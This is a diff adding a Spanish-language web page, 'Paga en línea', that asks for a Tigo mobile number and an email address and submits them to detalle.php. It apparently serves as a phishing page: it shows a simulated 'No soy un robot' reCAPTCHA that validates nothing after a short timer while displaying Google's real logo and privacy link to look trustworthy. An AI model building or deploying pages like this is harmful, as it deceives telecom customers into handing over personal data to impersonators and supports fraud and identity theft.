@@ -1,0 +1,234 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Paga en línea</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      justify-content: center;
+    }
+
+    header img,
+    footer img {
+      width: 100%;
+      max-width: 1000px;
+      display: block;
+    }
+
+    .contenedor {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      margin: 30px 0;
+    }
+
+    input {
+      width: 100%;
+      padding: 15px;
+      margin-top: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+
+    .captcha-simulacion {
+      margin-top: 20px;
+      background-color: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 4px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 3px 15px;
+      user-select: none;
+      cursor: pointer;
+      width: 90%;
+    }
+
+    .captcha-left {
+      display: flex;
+      align-items: center;
+    }
+
+    .captcha-checkbox {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #c3c3c3;
+      margin-right: 10px;
+      border-radius: 2px;
+      background-color: #fff;
+      position: relative;
+    }
+
+    .captcha-checkbox.checked::after {
+      content: "✔";
+      color: green;
+      font-size: 16px;
+      position: absolute;
+      top: -4px;
+      left: 2px;
+    }
+
+    .captcha-texto {
+      font-size: 14px;
+      color: #202124;
+    }
+
+    .captcha-logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .captcha-logo img {
+      height: 30px;
+    }
+
+    .captcha-logo span {
+      font-size: 11px;
+      color: #999;
+    }
+
+    .captcha-logo a {
+      font-size: 8px;
+      color: #0050c8;
+      text-decoration: none;
+    }
+
+    .captcha-logo a:hover {
+      text-decoration: underline;
+    }
+
+    /* Botón */
+    button {
+      padding: 10px;
+      width: 9%;  /* Ancho 50% */
+      background-color: #b7ebff; /* Azul clarito */
+      color: white;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      cursor: pointer;
+      display: block;
+      margin-left: auto; /* Alineación a la derecha */
+      margin-right: 0; /* Sin margen derecho */
+      transition: background-color 0.3s ease;
+    }
+
+    button.activo {
+      background-color: #54c9fd; /* Azul oscuro cuando el campo está lleno */
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .contenedor {
+        padding: 20px;
+        margin: 20px 10px;
+      }
+
+      button {
+        width: 50%;  /* El botón ocupará el 50% del ancho también en móviles */
+        margin-left: auto; /* Alineado a la derecha */
+        margin-right: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Banner superior -->
+<img src="ban.jpeg" alt="" width="100%">
+    
+  <br><br><br><br>
+  <!-- Formulario -->
+  
+  
+  <div class="contenedor">
+      <img src="pa.jpeg" alt="" width="100%">
+      
+      <br><br><br>
+    <form action="detalle.php" method="POST" onsubmit="return validarCaptcha()">
+
+      <img src="nu.jpeg" alt="Imagen de número" width="100%">
+      <input type="tel" id="numero" name="numero" placeholder="Línea Móvil Tigo" required>
+<br><br>
+      <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
+
+      <img src="pre.jpeg" alt="Imagen de precios" width="100%">
+<br><br><br><br>
+      <!-- CAPTCHA simulado -->
+      <div class="captcha-simulacion" onclick="simularCaptcha()">
+        <div class="captcha-left">
+          <div class="captcha-checkbox" id="captchaCheckbox"></div>
+          <div class="captcha-texto" id="captchaTexto">No soy un robot</div>
+        </div>
+        
+        <div class="captcha-logo">
+          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+          <span>reCAPTCHA</span>
+          <a href="https://policies.google.com/privacy" target="_blank">Privacidad -Condiciones</a>
+        </div>
+      </div>
+<br><br>
+      <!-- Botón -->
+      <button id="botonContinuar" type="submit">Continuar</button>
+
+    </form>
+  </div>
+<br><br><br><br>
+  <!-- Footer -->
+  <footer>
+    <img src="fin.jpeg" alt="Pie de página">
+  </footer>
+
+  <script>
+    let captchaValidado = false;
+
+    function simularCaptcha() {
+      const checkbox = document.getElementById("captchaCheckbox");
+      const texto = document.getElementById("captchaTexto");
+
+      if (captchaValidado) return;
+
+      texto.textContent = "Validando...";
+      setTimeout(() => {
+        checkbox.classList.add("checked");
+        texto.textContent = "No soy un robot";
+        captchaValidado = true;
+      }, 1500);
+    }
+
+    function validarCaptcha() {
+      if (!captchaValidado) {
+        alert("Por favor verifica que no eres un robot.");
+        return false;
+      }
+      return true;
+    }
+
+    document.getElementById("numero").addEventListener("input", function () {
+      const boton = document.getElementById("botonContinuar");
+      boton.classList.toggle("activo", this.value.trim() !== "");
+    });
+  </script>
+
+</body>
+</html>
